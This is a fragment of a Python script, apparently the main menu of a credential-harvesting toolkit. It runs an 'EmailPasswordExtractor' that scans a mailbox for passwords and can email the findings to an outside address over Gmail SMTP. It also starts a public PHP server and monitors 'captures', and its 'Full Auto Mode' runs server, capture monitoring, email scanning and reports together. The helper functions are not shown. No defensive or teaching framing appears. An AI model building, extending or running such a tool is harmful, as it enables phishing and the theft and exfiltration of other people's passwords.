    elif choice == '2':
        print(f"\n{c.C}🔍 Email scanner...{c.E}\n")
        
        num_emails = input(f"{c.C}Emails to scan (50): {c.E}").strip()
        num_emails = int(num_emails) if num_emails.isdigit() else 50
        
        extractor = EmailPasswordExtractor(EMAIL_FROM, EMAIL_PASS)
        results = extractor.scan_emails(num_emails=num_emails)
        
        if results:
            report = extractor.generate_report()
            print(f"\n{report}\n")
            
            filename = f"email_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, 'w') as f:
                f.write(report)
            
            print(f"{c.G}✅ Report saved: {filename}{c.E}\n")
            
            send = input(f"{c.C}Email report? (y/n): {c.E}").strip().lower()
            
            if send == 'y':
                try:
                    msg = MIMEMultipart()
                    msg['From'] = EMAIL_FROM
                    msg['To'] = EMAIL_TO
                    msg['Subject'] = f"🔍 Email Scan - {len(results)} Findings"
                    
                    msg.attach(MIMEText(report, 'plain'))
                    
                    with open(filename, 'rb') as f:
                        attachment = MIMEBase('application', 'octet-stream')
                        attachment.set_payload(f.read())
                        encoders.encode_base64(attachment)
                        attachment.add_header('Content-Disposition', f'attachment; filename={filename}')
                        msg.attach(attachment)
                    
                    srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
                    srv.starttls()
                    srv.login(EMAIL_FROM, EMAIL_PASS)
                    srv.send_message(msg)
                    srv.quit()
                    
                    print(f"{c.G}✅ Report sent!{c.E}\n")
                except Exception as e:
                    print(f"{c.R}❌ Failed: {e}{c.E}\n")
        else:
            print(f"{c.Y}⚠️ No data found{c.E}\n")
        
        input(f"\n{c.C}Press Enter...{c.E}")
    
    elif choice == '3':
        print(f"\n{c.C}📊 Generating report...{c.E}\n")
        
        report = intel_engine.generate_intelligence_report()
        print(f"\n{report}\n")
        
        filename = f"intel_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(report)
        
        print(f"{c.G}✅ Saved: {filename}{c.E}\n")
        
        input(f"\n{c.C}Press Enter...{c.E}")
    
    elif choice == '4':
        php_process = start_server()
        
        print(f"\n{c.Y}💡 Server running. Ctrl+C to stop...{c.E}\n")
        
        try:
            monitor_captures()
        except KeyboardInterrupt:
            print(f"\n\n{c.Y}🛑 Stopping...{c.E}\n")
            php_process.terminate()
    
    elif choice == '5':
        print(f"\n{c.C}🚀 Full Auto Mode...{c.E}\n")
        
        php_process = start_server()
        
        threading.Thread(target=monitor_captures, daemon=True).start()
        
        if ENABLE_EMAIL_SCANNING:
            threading.Thread(target=run_email_scanner, daemon=True).start()
        
        if ENABLE_AUTO_REPORTS:
            threading.Thread(target=auto_report_generator, daemon=True).start()
        
        print(f"{c.G}✅ All systems active!{c.E}\n")
        print(f"{c.C}📊 Running:{c.E}")
        print(f"{c.C}  • Server: {PUBLIC_URL}{c.E}")
        print(f"{c.C}  • Capture monitoring{c.E}")
        
        if ENABLE_EMAIL_SCANNING:
            print(f"{c.C}  • Email scanner{c.E}")
        
        if ENABLE_AUTO_REPORTS:
            print(f"{c.C}  • Auto reports{c.E}")
        
        print(f"\n{c.Y}💡 Press Ctrl+C to stop...{c.E}\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n{c.Y}🛑 Stopping...{c.E}\n")
            php_process.terminate()
    
    elif choice == '0':
        print(f"\n{c.G}👋 Goodbye!{c.E}\n")
        sys.exit(0)
    
    else:
        print(f"\n{c.R}❌ Invalid option{c.E}\n")


if __name__ == "__main__":
    try:
        while True:
            main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{c.G}👋 Goodbye!{c.E}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{c.R}❌ Fatal error: {e}{c.E}\n")
        sys.exit(1)
